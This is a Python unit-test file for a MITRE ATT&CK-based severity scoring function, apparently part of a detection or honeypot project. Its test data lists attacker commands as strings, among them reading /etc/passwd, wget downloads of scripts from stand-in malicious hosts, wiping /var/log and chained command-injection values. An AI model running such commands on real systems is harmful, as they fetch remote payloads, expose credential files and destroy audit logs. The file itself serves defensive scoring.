"""Unit tests for the severity scoring formula (mitre.py)."""
from mitre import combine_severity, severity_from_events


# ---------------------------------------------------------------------------
# combine_severity (the incremental accumulation used by the ingest path)
# ---------------------------------------------------------------------------
def test_combine_severity_adds_positive_weights():
    assert combine_severity(0.0, 1.0) == 1.0
    assert combine_severity(1.5, 3.0) == 4.5
    assert combine_severity(0.5, 0.5) == 1.0


def test_combine_severity_ignores_non_detections():
    # Non-mapped events contribute 0; negatives / None must never lower a score
    assert combine_severity(2.0, 0.0) == 2.0
    assert combine_severity(2.0, None) == 2.0
    assert combine_severity(2.0, -1.0) == 2.0


def test_combine_severity_rounds_to_two_decimals():
    assert combine_severity(0.1, 0.2) == 0.3


# ---------------------------------------------------------------------------
# severity_from_events (scoring formula as a pure function)
# ---------------------------------------------------------------------------
def test_severity_from_events_empty():
    assert severity_from_events([]) == 0.0


def test_severity_from_events_accumulates_mapped_weights():
    events = [
        ("login_failed", ""),   # T1110 -> 0.5
        ("login", ""),          # T1078 -> 1.0
        ("command", "whoami"),  # T1033 -> 1.0
    ]
    assert severity_from_events(events) == 2.5


def test_severity_from_events_ignores_unmapped_commands():
    events = [
        ("command", "ls -la /tmp"),   # no rule
        ("login", ""),                # 1.0
        ("command", "pwd"),           # no rule
    ]
    assert severity_from_events(events) == 1.0


def test_full_attack_session_score():
    """Mirrors the attack simulator's command chain and asserts the expected
    additive severity for the whole session."""
    timeline = [
        ("login_failed", ""),                            # T1110 -> 0.5
        ("login", ""),                                   # T1078 -> 1.0
        ("command", "whoami"),                           # T1033 -> 1.0
        ("command", "cat /etc/passwd"),                  # T1003.008 -> 5.0
        ("command", "wget http://malicious.com/m.sh"),   # T1105 -> 3.0
        ("command", "chmod +x m.sh"),                    # T1222.002 -> 2.0
        ("command", "rm -rf /var/log/*"),                # T1070 -> 4.0
    ]
    assert severity_from_events(timeline) == 16.5


def test_severity_matches_incremental_combine():
    """The batch formula must agree with incrementally calling combine_severity,
    which is exactly how the live ingest path accumulates the score."""
    weights = [1.0, 0.5, 5.0, 3.0]
    batch = severity_from_events([("command", "whoami"),
                                  ("login_failed", ""),
                                  ("command", "cat /etc/passwd"),
                                  ("command", "wget http://x/t")])
    incremental = 0.0
    for w in weights:
        incremental = combine_severity(incremental, w)
    assert batch == incremental


def test_harness_attack_session_score():
    """Mirrors the authenticated attack session from attacker/scripts/full-attack.sh
    where session cookies bind the post-exploitation commands into one session.
    Asserts the exact cumulative severity score of 26.0 recorded in results/case_study_raw.json.
    """
    authenticated_campaign = [
        ("sqli", None),                                      # Step 1: SQLi Login Bypass -> T1190 (4.0)
        ("command", "ping -c 1 127.0.0.1; whoami"),          # Step 2: User Discovery -> T1033 (1.0)
        ("command", "ping -c 1 127.0.0.1; uname -a"),        # Step 3: System Discovery -> T1082 (1.0)
        ("command", "ping -c 1 127.0.0.1; cat /etc/passwd"), # Step 4: Credential Dumping -> T1003.008 (5.0)
        ("command", "ping -c 1 127.0.0.1; wget http://evil.example/malware.sh"), # Step 5: Ingress Tool Transfer -> T1105 (3.0)
        ("command", "cat /etc/passwd"),                      # Step 6: Path Traversal /etc/passwd -> T1003.008 (5.0)
        ("command", "cat /etc/portal.conf"),                 # Step 7: Path Traversal portal.conf -> Unmapped (0.0)
        ("http", None),                                      # Step 8: Reflected XSS -> T1190 (4.0)
        ("file_upload", None),                               # Step 9: Web Shell Upload -> T1505.003 (3.0)
    ]
    assert severity_from_events(authenticated_campaign) == 26.0

